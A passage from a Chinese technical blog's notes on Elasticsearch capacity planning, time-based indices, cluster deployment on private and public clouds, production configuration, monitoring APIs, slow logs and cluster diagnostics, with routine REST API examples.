的分片策略会尽量保证节点上的分片数大致相同<ul><li>扩容的新节点没有数据，导致新索引集中在新的节点</li><li>热点数据过于集中，可能会产生新能问题</li></ul></li></ul><p><img src="/images/big-data/es-07/18.jpg" alt="18"></p><h3 id="如何对集群进行容量规划"><a href="#如何对集群进行容量规划" class="headerlink" title="如何对集群进行容量规划"></a>如何对集群进行容量规划</h3><h3 id="容量规划"><a href="#容量规划" class="headerlink" title="容量规划"></a>容量规划</h3><ul><li>一个集群总共需要多少个节点？ 一个索引需要设置几个分片？<ul><li>规划上需要保持一定的余量，当负载出现波动，节点出现丢失时，还能正常运行</li></ul></li><li>做容量规划时，一些需要考虑的因素<ul><li>机器的软硬件配置</li><li>单条文档的尺寸 / 文档的总数据量 / 索引的总数据量（Time base 数据保留的时间）/ 副本分片数</li><li>文档是如何写入的（Bulk 的尺寸）</li><li>文档的复杂度，文档是如何进行读取的（怎么样的查询和聚合）</li></ul></li></ul><h3 id="评估业务的性能需求"><a href="#评估业务的性能需求" class="headerlink" title="评估业务的性能需求"></a>评估业务的性能需求</h3><ul><li>数据吞吐及性能需求<ul><li>数据写入的吞吐量，每秒要求写入多少数据？</li><li>查询的吞吐量？</li><li>单条查询可接受的最大返回时间？</li></ul></li><li>了解你的数据<ul><li>数据的格式和数据的 Mapping</li><li>实际的查询和聚合长的是什么样的</li></ul></li></ul><h3 id="常见用例"><a href="#常见用例" class="headerlink" title="常见用例"></a>常见用例</h3><ul><li>搜索：固定大小的数据集<ul><li>搜索的数据集增长相对比较缓慢</li></ul></li><li>日志：基于时间序列的数据<ul><li>使用 ES 存放日志与性能指标。数据每天不断写入，增长速度较快</li><li>结合 Warm Node 做数据的老化处理</li></ul></li></ul><h3 id="硬件配置"><a href="#硬件配置" class="headerlink" title="硬件配置"></a>硬件配置</h3><ul><li>选择合理的硬件，<strong>数据节点尽可能使用 SSD</strong></li><li>搜索等性能要求高的场景，建议 SSD<ul><li>按照 1 ：10 的比例配置内存和硬盘</li></ul></li><li>日志类和查询并发低的场景，可以考虑使用机械硬盘存储<ul><li>按照 1：50 的比例配置内存和硬盘</li></ul></li><li>单节点数据建议控制在 2 TB 以内，最大不建议超过 5 TB<ul><li>JVM 配置机器内存的一半，JVM 内存配置不建议超过 32 G</li></ul></li></ul><h3 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h3><ul><li>按需选择合理的部署方式</li><li>如果需要考虑可靠性高可用，建议部署 3 台 dedicated 的 Master 节点</li><li>如果有复杂的查询和聚合，建议设置 Coordinating 节点</li></ul><h3 id="容量规划案例-1-固定大小的数据集"><a href="#容量规划案例-1-固定大小的数据集" class="headerlink" title="容量规划案例 1: 固定大小的数据集"></a>容量规划案例 1: 固定大小的数据集</h3><ul><li>一些案例：唱片信息库 / 产品信息</li><li>一些特性<ul><li>被搜索的数据集很大，但是增长相对比较慢（不会有大量的写入）。更关心搜索和聚合的读取性能</li><li>数据的重要性与时间范围无关。关注的是搜索的相关度</li></ul></li><li>估算索引的的数据量，然后确定分片的大小<ul><li>单个分片的数据不要超过 20 GB</li><li>可以通过增加副本分片，提高查询的吞吐量</li></ul></li></ul><h3 id="拆分索引"><a href="#拆分索引" class="headerlink" title="拆分索引"></a>拆分索引</h3><ul><li>如果业务上有大量的查询是基于一个字段进行 Filter，该字段又是一个数量有限的枚举值<ul><li>例如订单所在的地区</li></ul></li><li>如果在单个索引有大量的数据，可以考虑将索引拆分成多个索引<ul><li>查询性能可以得到提高</li><li>如果要对多个索引进行查询，还是可以在查询中指定多个索引得以实现</li></ul></li><li>如果业务上有大量的查询是基于一个字段进行 Filter，该字段数值并不固定<ul><li>可以启用 Routing 功能，按照 filter 字段的值分布到集群中不同的 shard，降低查询时相关的 shard， 提高 CPU 利用率</li></ul></li></ul><h3 id="容量规划案例-2-基于时间序列的数据"><a href="#容量规划案例-2-基于时间序列的数据" class="headerlink" title="容量规划案例 2: 基于时间序列的数据"></a>容量规划案例 2: 基于时间序列的数据</h3><ul><li>相关的用案<ul><li>日志 / 指标 / 安全相关的 Events</li><li>舆情分析</li></ul></li><li>一些特性<ul><li>每条数据都有时间戳；文档基本不会被更新（日志和指标数据）</li><li>用户更多的会查询近期的数据；对旧的数据查询相对较少</li><li>对数据的写入性能要求比较高</li></ul></li></ul><h3 id="创建基于时间序列的索引"><a href="#创建基于时间序列的索引" class="headerlink" title="创建基于时间序列的索引"></a>创建基于时间序列的索引</h3><ul><li>创建 time-based 索引<ul><li>在索引的名字中增加时间信息</li><li>按照 每天 / 每周 / 每月 的方式进行划分</li></ul></li><li>带来的好处<ul><li>更加合理的组织索引，例如随着时间推移，便于对索引做的老化处理<ul><li>利用 Hot &amp; Warm Architecture</li><li>备份和删除以及删除的效率高。（ Delete By Query 执行速度慢，底层也不会立刻释放空间，而 Merge 时又很消耗资源）</li></ul></li></ul></li></ul><h3 id="写入时间序列的数据：基于-Date-Math-的方式"><a href="#写入时间序列的数据：基于-Date-Math-的方式" class="headerlink" title="写入时间序列的数据：基于 Date Math 的方式"></a>写入时间序列的数据：基于 Date Math 的方式</h3><ul><li>容易使用</li><li>如果时间发生变化，需要重新部署代码</li></ul><p><img src="/images/big-data/es-07/19.jpg" alt="19"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// POST /&lt;logs-&#123;now/d&#125;/_search </span></span><br><span class="line">POST /%3Clogs-%7Bnow%2Fd%7D%3E/_search</span><br></pre></td></tr></table></figure><h3 id="写入时间序列的数据-–-基于-Index-Alias"><a href="#写入时间序列的数据-–-基于-Index-Alias" class="headerlink" title="写入时间序列的数据 – 基于 Index Alias"></a>写入时间序列的数据 – 基于 Index Alias</h3><ul><li>Time-based 索引<ul><li>创建索引，每天 / 每周 / 每月</li><li>在索引的名字中增加时间信息</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PUT logs_2019-06-27</span><br><span class="line">PUT logs_2019-06-26</span><br><span class="line"></span><br><span class="line">POST _aliases</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"add"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"logs_2019-06-27"</span>,</span><br><span class="line">        <span class="attr">"alias"</span>: <span class="string">"logs_write"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"remove"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"logs_2019-06-26"</span>,</span><br><span class="line">        <span class="attr">"alias"</span>: <span class="string">"logs_write"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST /&lt;logs-&#123;now/d&#125;/_search</span></span><br><span class="line">POST /%3Clogs-%7Bnow%2Fd%7D%3E/_search</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST /&lt;logs-&#123;now/w&#125;/_search</span></span><br><span class="line">POST /%3Clogs-%7Bnow%2Fw%7D%3E/_search</span><br></pre></td></tr></table></figure><h3 id="集群扩容"><a href="#集群扩容" class="headerlink" title="集群扩容"></a>集群扩容</h3><ul><li>增加 Coordinating / Ingest Node<ul><li>解决 CPU 和 内存开销的问题</li></ul></li><li>增加数据节点<ul><li>解决存储的容量的问题</li><li>为避免分片分布不均的问题，要提前监控磁盘空间，提前清理数据或增加节点（70%）</li></ul></li></ul><p><strong>小结</strong></p><ul><li>根据 ES 的使用场景，建议将搜索类和日志类的应用部署在不同的 ES 群上<ul><li>可以针对写入和读取做优化</li></ul></li><li>根据场景选择合适的部署方式</li><li>硬件配置，数据节点推荐使用 SSD<ul><li>对于日志类的应用，可以选择使用冷热架构</li></ul></li><li>索引的设计，分片的设计也至关重要<ul><li>时间序列的索引 / 单个分片的尺寸，搜索类保持在 20G 以内，日志类保持在 50G以内</li></ul></li></ul><h2 id="在私有云上管理与部署-Elasticsearch-集群"><a href="#在私有云上管理与部署-Elasticsearch-集群" class="headerlink" title="在私有云上管理与部署 Elasticsearch 集群"></a>在私有云上管理与部署 Elasticsearch 集群</h2><h3 id="管理单个集群"><a href="#管理单个集群" class="headerlink" title="管理单个集群"></a>管理单个集群</h3><ul><li>集群容量不够时，需手工增加节点<ul><li>有节点丢失时，手工修复或更换节点</li><li>确保 Rack Awareness</li></ul></li><li>集群版本升级;数据备份;滚动升级<ul><li>完全手动，管理成本高</li><li>无法统一管理，例如整合变更管理等</li></ul></li></ul><h3 id="ECE，帮助你管理多个-ES-集群"><a href="#ECE，帮助你管理多个-ES-集群" class="headerlink" title="ECE，帮助你管理多个 ES 集群"></a>ECE，帮助你管理多个 ES 集群</h3><ul><li>ECE - Elastic Cloud Enterprise<ul><li><a href="https://www.elastic.co/cn/ece" target="_blank" rel="noopener">https://www.elastic.co/cn/ece</a></li><li><a href="https://www.elastic.co/cn/downloads/enterprise" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads/enterprise</a></li></ul></li><li>通过单个控制台，管理多个集群<ul><li>支持不同方式的集群部署（支持各类部署）/ 跨数据中心 / 部署 Anti Affinity</li><li>统一监控所有集群的状态</li><li>图形化操作<ul><li>增加删除节点</li><li>升级集群 / 滚动更新 / 自动数据备份</li></ul></li></ul></li></ul><h3 id="基于-Kubernetes-的方案"><a href="#基于-Kubernetes-的方案" class="headerlink" title="基于 Kubernetes 的方案"></a>基于 Kubernetes 的方案</h3><ul><li>基于容器技术，使用 Operator 模式进行编排管理</li><li>配置，管理监控多个集群</li><li>支持 Hot &amp; Warm</li><li>数据快照和恢复</li><li><a href="https://www.elastic.co/cn/downloads/elastic-cloud-kubernetes" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads/elastic-cloud-kubernetes</a></li></ul><h3 id="构建自己的管理系统"><a href="#构建自己的管理系统" class="headerlink" title="构建自己的管理系统"></a>构建自己的管理系统</h3><ul><li>基于虚拟机的编排管理方式<ul><li>Puppet Infrastructure (Puppet / Elasticsearch Puppet Module/ Foreman)</li><li>Workflow based Provision &amp; Management</li></ul></li><li>基于 Kubernetes 的容器化编排管理方式<ul><li>基于 Operator 模式</li><li>Kubernetes - CRD (Customer Resource Definition)</li></ul></li></ul><h3 id="将-Elasticsearch-部署在-Kubernetes"><a href="#将-Elasticsearch-部署在-Kubernetes" class="headerlink" title="将 Elasticsearch 部署在 Kubernetes"></a>将 Elasticsearch 部署在 Kubernetes</h3><p><img src="/images/big-data/es-07/23.jpg" alt="23"></p><h3 id="什么是-Kubernetes-Operator-模式"><a href="#什么是-Kubernetes-Operator-模式" class="headerlink" title="什么是 Kubernetes Operator 模式"></a>什么是 Kubernetes Operator 模式</h3><p><img src="/images/big-data/es-07/24.jpg" alt="24"></p><blockquote><p><a href="https://github.com/operator-framework/operator-sdk" target="_blank" rel="noopener">https://github.com/operator-framework/operator-sdk</a></p></blockquote><p><strong>相关阅读</strong></p><ul><li><a href="https://www.elastic.co/cn/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond?elektra=products&amp;storm=sub1" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond?elektra=products&amp;storm=sub1</a></li><li><a href="https://www.elastic.co/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond" target="_blank" rel="noopener">https://www.elastic.co/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond</a></li><li><a href="https://github.com/operator-framework" target="_blank" rel="noopener">https://github.com/operator-framework</a></li><li><a href="https://github.com/upmc-enterprises/elasticsearch-operator" target="_blank" rel="noopener">https://github.com/upmc-enterprises/elasticsearch-operator</a></li></ul><h2 id="在公有云上管理与部署-Elasticsearch-集群"><a href="#在公有云上管理与部署-Elasticsearch-集群" class="headerlink" title="在公有云上管理与部署 Elasticsearch 集群"></a>在公有云上管理与部署 Elasticsearch 集群</h2><ul><li>Elastic Cloud<ul><li><a href="https://www.elastic.co/cn/cloud/" target="_blank" rel="noopener">https://www.elastic.co/cn/cloud/</a></li></ul></li><li>阿里云<ul><li><a href="https://www.aliyun.com/product/bigdata/product/elasticsearch" target="_blank" rel="noopener">https://www.aliyun.com/product/bigdata/product/elasticsearch</a></li></ul></li><li>腾讯云<ul><li><a href="https://cloud.tencent.com/product/es" target="_blank" rel="noopener">https://cloud.tencent.com/product/es</a></li></ul></li></ul><p><strong>相关阅读</strong></p><ul><li><a href="https://data.aliyun.com/product/elasticsearch" target="_blank" rel="noopener">https://data.aliyun.com/product/elasticsearch</a></li><li><a href="https://www.elastic.co/cn/blog/elasticsearch-service-on-elastic-cloud-introduces-new-pricing-with-reduced-costs" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/elasticsearch-service-on-elastic-cloud-introduces-new-pricing-with-reduced-costs</a></li></ul><h2 id="生产环境常用配置和上线清单"><a href="#生产环境常用配置和上线清单" class="headerlink" title="生产环境常用配置和上线清单"></a>生产环境常用配置和上线清单</h2><h3 id="Development-vs-Production-Mode"><a href="#Development-vs-Production-Mode" class="headerlink" title="Development vs. Production Mode"></a>Development vs. Production Mode</h3><ul><li>从 ES 5 开始，支持 Development 和 Production 两种运行模式<ul><li>开发模式</li><li>生产模式</li></ul></li><li>ES 会检测是否是 loopback，来判定是什么模式</li></ul><p><img src="/images/big-data/es-07/20.jpg" alt="20"></p><h3 id="Bootstrap-Checks"><a href="#Bootstrap-Checks" class="headerlink" title="Bootstrap Checks"></a>Bootstrap Checks</h3><ul><li>一个集群在 Production Mode 时，启动时必须通过所有 Bootstrap 检测，否则会启动失败</li><li>Bootstrap Checks 可以分为两类：JVM &amp; Linux Checks。Linux Checks 只针对 Linux 系统</li></ul><p><img src="/images/big-data/es-07/21.jpg" alt="21"></p><blockquote><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/master/bootstrap-checks.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/master/bootstrap-checks.html</a></p></blockquote><h3 id="JVM-设定"><a href="#JVM-设定" class="headerlink" title="JVM 设定"></a>JVM 设定</h3><ul><li>从 ES 6 开始， 只支持 64 位 的JVM<ul><li>配置 <code>config/vm.options</code></li></ul></li><li>避免修改默认配置<ul><li>将内存 Xms 和 Xmx 设置成一样，避免 heap resize 时引发停顿</li><li>Xmx 设置不要超过物理内存的 50%；单个节点上，最大内存建议不要超过 32G 内存<ul><li><a href="https://www.elastic.co/cn/blog/a-heap-of-trouble" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/a-heap-of-trouble</a></li></ul></li><li>生产环境，JVM 必须使用 Server 模式</li><li>关闭 JVM Swapping</li></ul></li></ul><h3 id="集群的-API-设定"><a href="#集群的-API-设定" class="headerlink" title="集群的 API 设定"></a>集群的 API 设定</h3><ul><li>静态设置和动态设定<ul><li>静态配置文件尽量简洁：按照文档设置所有相关系统参数。elasticsearch.yml 配置文件 中尽量只写必备参数</li></ul></li><li>其他的设置项可以通过 API 动态进行设定。 动态设定分 transient 和 persistent 两种， 都会覆盖 elasticsearch.yaml 中的设置<ul><li>Transient 在集群重启后会丢失</li><li>Persistent 在集群中重启后不会丢失</li></ul></li></ul><p><img src="/images/big-data/es-07/22.jpg" alt="22"></p><h3 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h3><ul><li>参照文档 “Setup Elasticsearch&gt; Important System Configuration”<ul><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/system-config.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/system-config.html</a> </li><li>Disable Swapping, Increase file descriptor, 虚拟内存, number of thread</li></ul></li></ul><h3 id="最佳实践：网络"><a href="#最佳实践：网络" class="headerlink" title="最佳实践：网络"></a>最佳实践：网络</h3><ul><li>单个集群不要跨数据中心进行部署（不要使用 WAN）</li><li>节点之间的 hops 越少越好</li><li>如果有多块网卡，最好将 transport 和 http 绑定到不同的网卡，并设置不同的防火墙 Rules</li><li>按需为 Coordinating Node 或 Ingest Node 配置负载均衡</li></ul><h3 id="最佳实践：内存设定计算实例"><a href="#最佳实践：内存设定计算实例" class="headerlink" title="最佳实践：内存设定计算实例"></a>最佳实践：内存设定计算实例</h3><ul><li>内存大小要根据 Node 需要存储的数据来进行估算<ul><li>搜索类的比例建议：1:16</li><li>日志类：1:48 - 1:96 之间</li></ul></li><li>总数据量 1 T， 设置一个副本 = 2T 总数据量<ul><li>如果搜索类的项目，每个节点 31*16 = 496 G，加上预留空间。所以每个节点最多 400G 数据，至少需要 5 个数据节点</li><li>如果是日志类项目，每个节点 31*50 = 1550 GB，2 个数据节点即可</li></ul></li></ul><h3 id="最佳实践：存储"><a href="#最佳实践：存储" class="headerlink" title="最佳实践：存储"></a>最佳实践：存储</h3><ul><li>推荐使用 SSD，使用本地存储（Local Disk）。避免使用 SAN NFS / AWS / Azure filesystem</li><li>可以在本地指定多个 “path.data”，以支持使用多块磁盘</li><li>ES 本身提供了很好的 HA 机制；无需使用 RAID 1/5/10</li><li>可以在 Warm 节点上使用 Spinning Disk，但是需要关闭 Concurrent Merges<ul><li><code>Index.merge.scheduler.max_thread_count: 1</code></li></ul></li><li>Trim 你的 SSD<ul><li><a href="https://www.elastic.co/cn/blog/is-your-elasticsearch-trimmed" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/is-your-elasticsearch-trimmed</a></li></ul></li></ul><h3 id="最佳实践：服务器硬件"><a href="#最佳实践：服务器硬件" class="headerlink" title="最佳实践：服务器硬件"></a>最佳实践：服务器硬件</h3><ul><li>建议使用中等配置的机器，不建议使用过于强劲的硬件配置<ul><li>Medium machine over large machine</li></ul></li><li>不建议在一台服务器上运行多个节点</li></ul><h3 id="集群设置：Throttles-限流"><a href="#集群设置：Throttles-限流" class="headerlink" title="集群设置：Throttles 限流"></a>集群设置：Throttles 限流</h3><ul><li>为 Relocation 和 Recovery 设置限流，避免过多任务对集群产生性能影响</li><li>Recovery<ul><li><code>Cluster.routing.allocation.node_concurrent_recoveries: 2</code></li></ul></li><li>Relocation<ul><li><code>Cluster.routing.allocation.cluster_concurrent_rebalance: 2</code></li></ul></li></ul><h3 id="集群设置：关闭-Dynamic-Indexes"><a href="#集群设置：关闭-Dynamic-Indexes" class="headerlink" title="集群设置：关闭 Dynamic Indexes"></a>集群设置：关闭 Dynamic Indexes</h3><ul><li>可以考虑关闭动态索引创建的功能</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"action.auto_create_index"</span>:<span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>或者通过模版设置白名单</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"action.auto_create_index"</span>:<span class="string">"logstash-*,.kibana*"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="集群安全设定"><a href="#集群安全设定" class="headerlink" title="集群安全设定"></a>集群安全设定</h3><ul><li>为 Elasticsearch 和 Kibana 配置安全功能<ul><li>打开 Authentication &amp; Authorization</li><li>实现索引和和字段级的安全控制</li></ul></li><li>节点间通信加密</li><li>Enable HTTPS</li><li>Audit logs</li></ul><h2 id="监控-Elasticsearch-集群"><a href="#监控-Elasticsearch-集群" class="headerlink" title="监控 Elasticsearch 集群"></a>监控 Elasticsearch 集群</h2><h3 id="Elasticsearch-Stats-相关的-API"><a href="#Elasticsearch-Stats-相关的-API" class="headerlink" title="Elasticsearch Stats 相关的 API"></a>Elasticsearch Stats 相关的 API</h3><ul><li>Elasticsearch 提供了多个监控相关的 API<ul><li>Node Stats： _nodes/stats</li><li>Cluster Stats: _cluster/stats</li><li>Index Stats: index_name/_stats</li></ul></li></ul><h3 id="Elasticsearch-Task-API"><a href="#Elasticsearch-Task-API" class="headerlink" title="Elasticsearch Task API"></a>Elasticsearch Task API</h3><ul><li>查看 Task 相关的 API<ul><li>Pending Cluster Tasks API：GET _cluster/pending_tasks</li><li>Task Management API：GET _tasks (可以用来 Cancel 一个 Task)</li></ul></li><li>监控 Thread Pools<ul><li>GET _nodes/thread_pool</li><li>GET _nodes/stats/thread_pool</li><li>GET _cat/thread_pool?v</li><li>GET _nodes/hot_threads</li></ul></li></ul><h3 id="The-Index-amp-Query-Slow-Log"><a href="#The-Index-amp-Query-Slow-Log" class="headerlink" title="The Index &amp; Query Slow Log"></a>The Index &amp; Query Slow Log</h3><ul><li>支持将分片上，Search 和 Fetch 阶段的慢查询写入文件</li><li>支持为 Query 和 Fetch 分别定义阈值</li><li>索引级的动态设置，可以按需设置，或者通过 Index Template 统一设定</li><li>Slog log 文件通过 log4j2.properties 配置</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置 Index Slowlogs</span></span><br><span class="line"><span class="comment">// the first 1000 characters of the doc's source will be logged</span></span><br><span class="line">PUT my_index/_settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"index.indexing.slowlog"</span>:&#123;</span><br><span class="line">    <span class="attr">"threshold.index"</span>:&#123;</span><br><span class="line">      <span class="attr">"warn"</span>:<span class="string">"10s"</span>,</span><br><span class="line">      <span class="attr">"info"</span>: <span class="string">"4s"</span>,</span><br><span class="line">      <span class="attr">"debug"</span>:<span class="string">"2s"</span>,</span><br><span class="line">      <span class="attr">"trace"</span>:<span class="string">"0s"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"level"</span>:<span class="string">"trace"</span>,</span><br><span class="line">    <span class="attr">"source"</span>:<span class="number">1000</span>  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置查询</span></span><br><span class="line">DELETE my_index</span><br><span class="line"><span class="comment">//"0" logs all queries</span></span><br><span class="line">PUT my_index/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.search.slowlog.threshold"</span>: &#123;</span><br><span class="line">      <span class="attr">"query.warn"</span>: <span class="string">"10s"</span>,</span><br><span class="line">      <span class="attr">"query.info"</span>: <span class="string">"3s"</span>,</span><br><span class="line">      <span class="attr">"query.debug"</span>: <span class="string">"2s"</span>,</span><br><span class="line">      <span class="attr">"query.trace"</span>: <span class="string">"0s"</span>,</span><br><span class="line">      <span class="attr">"fetch.warn"</span>: <span class="string">"1s"</span>,</span><br><span class="line">      <span class="attr">"fetch.info"</span>: <span class="string">"600ms"</span>,</span><br><span class="line">      <span class="attr">"fetch.debug"</span>: <span class="string">"400ms"</span>,</span><br><span class="line">      <span class="attr">"fetch.trace"</span>: <span class="string">"0s"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my_index</span><br></pre></td></tr></table></figure><h3 id="如何创建监控-Dashboard"><a href="#如何创建监控-Dashboard" class="headerlink" title="如何创建监控 Dashboard"></a>如何创建监控 Dashboard</h3><ul><li>开发 Elasticsearch plugin，通过读取相关的监控 API，将数据发送到 ES，或者 TSDB</li><li>使用 Metricbeats 搜集相关指标</li><li>使用 Kibana 或 Grafana 创建 Dashboard</li><li>可以开发 Elasticsearch Exporter，通过 Prometheus 监控 Elasticsearch 集群</li></ul><h2 id="诊断集群的潜在问题"><a href="#诊断集群的潜在问题" class="headerlink" title="诊断集群的潜在问题"></a>诊断集群的潜在问题</h2><h3 id="集群运维所面临的挑战"><a href="#集群运维所面临的挑战" class="headerlink" title="集群运维所面临的挑战"></a>集群运维所面临的挑战</h3><ul><li>用户集群数量多，业务场景差异大</li><li>使用与配置不当，优化不够<ul><li>如何让用户更加高效和正确的使用 ES</li><li>如何让用户更全面的了解自己的集群的使用状况</li></ul></li><li>发现问题滞后，需要防患于未然<ul><li>需要 “有迹可循”，做到 “有则改之，无则加勉”</li><li>Elastic 有提供 <a href="https://github.com/elastic/support-diagnostics" target="_blank" rel="noopener">Support Diagnostics Tool</a></li></ul></li></ul><h3 id="集群绿色，是否意味着足够好"><a href="#集群绿色，是否意味着足够好" class="headerlink" title="集群绿色，是否意味着足够好"></a>集群绿色，是否意味着足够好</h3><ul><li>绿色只是其中一项指标。显示分片是否都已正常分配</li><li>监控指标多并且分散<ul><li>指标的含义不够明确直观</li></ul></li><li>问题分析定位的门槛较高<ul><li>需要具备专业知识</li></ul></li></ul><h3 id="为什么要诊断集群的潜在问题"><a href="#为什么要诊断集群的潜在问题" class="headerlink" title="为什么要诊断集群的潜在问题"></a>为什么要诊断集群的潜在问题</h3><ul><li>防患于未然，避免集群奔溃<ul><li>Master 节点 / 数据节点当机 – 负载过高，导致节点失联</li><li>副本丢失，导致数据可靠性受损</li><li>集群压力过大，数据写入失败</li></ul></li><li>提升集群性能<ul><li>数据节点负载不均衡（避免单节点瓶颈） / 优化分片，segment</li><li>规范操作方式（利用别名 / 避免 Dynamic Mapping 引发过多字段，对索引的合理性进行管控）</li></ul></li></ul><h3 id="eBay-Diagnostic-Tool"><a href="#eBay-Diagnostic-Tool" class="headerlink" title="eBay Diagnostic Tool"></a>eBay Diagnostic Tool</h3><ul><li>集群健康状态，是否有节点丢失</li><li>索引合理性<ul><li>索引总数不能过大 / 副本分片尽量不要设置为 0 / 主分片尺 寸检测 / 索引的字段总数（Dynamic Mapping 关闭）/ 索引是 否分配不均衡 / 索引 segment 大小诊断分析</li></ul></li><li>资源使用合理性<ul><li>CPU 内存和 磁盘的使用状况分析 / 是否存在节点负载不平衡 / 是否需要增加节点</li></ul></li><li>业务操作合理性<ul><li>集群状态变更频率，是否在业务高峰期有频繁操作</li><li>慢查询监控与分析</li></ul></li></ul><h4 id="集群中索引的诊断"><a href="#集群中索引的诊断" class="headerlink" title="集群中索引的诊断"></a>集群中索引的诊断</h4><ul><li>索引的总数是否过大</li><li>是否存在字段过多的情况</li><li>索引的分片个数是否设置合理</li><li>单个节点的分片数是否过多</li><li>数据节点之间的负载偏差是否过大</li><li>冷热数据分配是否正确（例如，Cold 节点 上的索引是否设置成只读）</li></ul><h3 id="阿里云-EYOU-智能运维工具"><a href="#阿里云-EYOU-智能运维工具" class="headerlink" title="阿里云 - EYOU 智能运维工具"></a>阿里云 - EYOU 智能运维工具</h3><ul><li>每天凌晨定时诊断，也可以自主诊断。每次诊断耗时 3 分钟</li><li><a href="https://help.aliyun.com/document_detail/90391.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/90391.html</a></li></ul><p><img src="/images/big-data/es-07/25.jpg" alt="25"></p><p><strong>诊断 Shard 数</strong></p><p><img src="/images/big-data/es-07/26.jpg" alt="26"></p><p><strong>磁盘容量估算</strong></p><p><img src="/images/big-data/es-07/27.jpg" alt="27"></p><h3 id="多维度检查，构建自己的诊断工具"><a href="#多维度检查，构建自己的诊断工具" class="headerlink" title="多维度检查，构建自己的诊断工具"></a>多维度检查，构建自己的诊断工具</h3><p><img src="/images/big-data/es-07/28.jpg" alt="28"></p><p><strong>相关阅读</strong></p><ul><li><a href="https://elasticsearch.cn/slides/162" target="_blank" rel="noopener">https://elasticsearch.cn/slides/162</a></li><li><a href="https://yq.aliyun.com/articles/657712" target="_blank" rel="noopener">https://yq.aliyun.com/articles/657712</a></li><li><a href="https://yq.aliyun.com/articles/657108" target="_blank" rel="noopener">https://yq.aliyun.com/articles/657108</a></li><li><a href="https://help.aliyun.com/document_detail/90391.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/90391.html</a></li></ul><h2 